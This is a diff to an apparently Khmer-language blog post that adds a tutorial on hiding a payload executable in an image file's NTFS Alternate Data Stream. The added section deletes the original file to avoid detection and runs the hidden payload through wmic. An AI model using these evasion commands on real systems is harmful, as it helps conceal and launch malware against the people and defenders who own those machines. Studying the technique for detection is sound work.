@@ -18,6 +18,34 @@ series:
 image: images/feature3/terminal.gif
 ---
 
+ខាងក្រោមជាវិធីសាស្ត្រក្នុងការលាក់ ផេឡូតនៅក្នុងឯកសារផ្សេងៗ។ ចំពោះកាបង្ហាញខាងក្រោមខ្ញុំនឹងសាកល្បងលាក់នៅក្នុងឯកសាររូបភាព (jpg, png, gif, etc.) ។
+
+### Hide Payload Inside Image File
+
+នៅក្នុងវីនដូសូមវាយពាក្យបញ្ជាដូចខាងក្រោម៖
+
+{{< highlight cmd "linenos=table" >}}
+type payload.exe > imagefile.png:payload.exe
+{{< / highlight >}}
+
+ក្រោយពីលាក់រួចយើងអាចពិនិត្យមើល ADS បានដោយប្រើពាក្យបញ្ជា <span style="color:grey;">dir /r</span> ។
+
+សូមធ្វើការលុបឯកសាមេរោគដើមចេញ ជៀសវៀងពីការរកឃើញ៖
+
+{{< highlight cmd "linenos=table" >}}
+del payload.exe
+{{< / highlight >}}
+
+ដើម្បីដំណើរការ payload យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖
+
+{{< highlight cmd "linenos=table" >}}
+wmic.exe process call create "C:\ProgramData\imagefile.png:payload.exe"
+{{< / highlight >}}
+
+រួចរាល់ ។
+
+### Hide Payload Through Certutil
+
 ជាគោលគំនិតក្នុងការលាក់ Payload ក្នុង ADS ដោយប្រើប្រាស់ [Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) ។
 
 #### Generate ADS
